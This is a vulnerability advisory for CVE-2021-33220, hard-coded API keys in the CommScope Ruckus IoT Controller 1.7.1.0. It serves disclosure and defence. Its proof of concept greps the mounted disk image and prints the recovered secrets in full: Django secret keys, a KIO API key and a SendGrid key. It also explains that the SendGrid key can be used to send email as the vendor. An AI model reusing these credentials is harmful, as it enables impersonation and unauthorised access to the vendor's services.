CommScope Ruckus IoT Controller 1.7.1.0 Hard-Coded API Keys Exposed Vulnerability


1. Vulnerability Details

     Affected Vendor: CommScope
     Affected Product: Ruckus IoT Controller
     Affected Version: 1.7.1.0 and earlier
     Platform: Linux
     CWE Classification: CWE-798: Use of Hard-coded Credentials
     CVE ID: CVE-2021-33220


2. Vulnerability Description

     API keys for CommScope Ruckus are included in the IoT
     Controller OVA image, and are exposed to attackers who mount
     the filesystem.


3. Technical Description

     Ruckus vRIoT server software is available from the software
     library at: https://support.ruckuswireless.com/software/

     Once the OVA is imported into VirtualBox, a VMDK file is
     created. The VMDK file can be mounted and the directory
     structure and its contents can be perused. The virtual appliance
     contains clear text API keys that are hard-coded into the
     web application code. The API keys can be abused to gain
     information about deployed assets and send email via SendGrid
     as Commscope/Ruckus. While the AWS SECRET_KEY is exposed,
     an ACCESS_KEY is not.


4. Mitigation and Remediation Recommendation

     The vendor has released an updated firmware (1.8.0.0) which
     remediates the described vulnerability. Firmware and release
     notes are available at:

7. Proof of Concept

     With the VMDK file mounted at the current working directory:
     root@vriot:/# grep -R 'KIO_API_KEY' /VRIOT/ 2>/dev/null
     ./VRIOT/backend/settings/defaults.py:KIO_API_KEY = os.environ.get("KIO_API_KEY", "wxtPbzgNNWFlfBqhDfEDoZkQUxtnhWTq")

     $ egrep -r 'SECRET_KEY|ACCESS_KEY' ./VRIOT/*
     ./VRIOT/authServer/app/baseapp/settings.py:SECRET_KEY = 'db$04-yk#-3&=54s78d-tvu!+e3#621kj9s!3g$x3t^@m1m6#i'
     ./VRIOT/backend/settings/settings.py:SECRET_KEY = '%u9-#a6eo0!ukif-+kcg3=gc-zlh8o3@)rz@!-74(g*xa0c#bb'
     Binary file ./VRIOT/backend/lora/lorawan1.6.0.0.tar matches
     Binary file ./VRIOT/ops/scripts/image_push.pyc matches
     ./VRIOT/ops/sqlite_modules/aws4/README.md:// or it can get credentials from process.env.AWS_ACCESS_KEY_ID, etc
     ./VRIOT/ops/sqlite_modules/aws4/README.md:export AWS_ACCESS_KEY_ID="<your-access-key-id>"
     ./VRIOT/ops/sqlite_modules/aws4/README.md:export AWS_SECRET_ACCESS_KEY="<your-secret-access-key>"
     ./VRIOT/ops/sqlite_modules/aws4/README.md:(will also use `AWS_ACCESS_KEY` and `AWS_SECRET_KEY` if available)
     ./VRIOT/ops/sqlite_modules/aws4/aws4.js:    accessKeyId: env.AWS_ACCESS_KEY_ID || env.AWS_ACCESS_KEY,
     ./VRIOT/ops/sqlite_modules/aws4/aws4.js:    secretAccessKey: env.AWS_SECRET_ACCESS_KEY || env.AWS_SECRET_KEY,


     $ more ./VRIOT/authServer# more app/baseapp/settings.py
     ...
     # Email server settings.
     EMAIL_HOST = 'smtp.sendgrid.net'
     EMAIL_HOST_USER = 'apikey'
     EMAIL_HOST_PASSWORD = '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'
     EMAIL_PORT = 587
     EMAIL_USE_TLS = True
     ...

     Per https://sendgrid.com/docs/API_Reference/SMTP_API/integrating_with_the_smtp_api.html,
     the SendGrid password identified above is actually an API key, which can be
     used with the 'apikey' user to send email through the SendGrid platform as
     Commscope Ruckus.
